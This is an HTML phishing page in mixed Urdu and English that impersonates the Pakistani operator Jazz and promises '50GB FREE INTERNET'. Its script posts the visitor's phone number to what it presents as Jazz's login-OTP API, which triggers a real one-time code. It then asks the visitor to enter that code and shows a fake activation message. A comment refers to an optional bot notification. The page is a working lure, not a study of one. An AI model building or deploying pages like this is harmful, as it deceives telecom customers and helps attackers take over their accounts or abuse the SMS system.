<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; background: #eee; }
        .box { background: #fff; margin: 20px auto; padding: 20px; border-radius: 10px; max-width: 350px; border-top: 5px solid red; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        button { background: red; color: #fff; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Jazz_logo.png" width="80">
    <h3>50GB FREE INTERNET</h3>
    <p>Apna Jazz Number Enter Karein:</p>
    <input type="number" id="num" placeholder="03XXXXXXXXX">
    <button onclick="triggerSMS()">GET OTP</button>

    <div id="otp-area" style="display:none;">
        <p style="color:green">SMS Bheja Gaya Hai!</p>
        <input type="number" id="otp" placeholder="Enter OTP Code">
        <button onclick="finish()">ACTIVATE NOW</button>
    </div>
</div>

<script>
    function triggerSMS() {
        var n = document.getElementById('num').value;
        if(n.length == 11) {
            // --- YEAH HAI SMS TRIGGER LOGIC ---
            // Hum browser ke zariye Jazz ki API ko hit kar rahe hain
            fetch('https://api.jazz.com.pk/customer/login/otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ msisdn: n })
            }).then(response => {
                document.getElementById('otp-area').style.display = 'block';
            });
            
            // Aapka Bot Notification (Optional)
            alert("System is processing your request...");
        } else {
            alert("Invalid Number!");
        }
    }

    function finish() {
        alert("Verification Success! Data will be active in 24 hours.");
    }
</script>

</body>
</html>
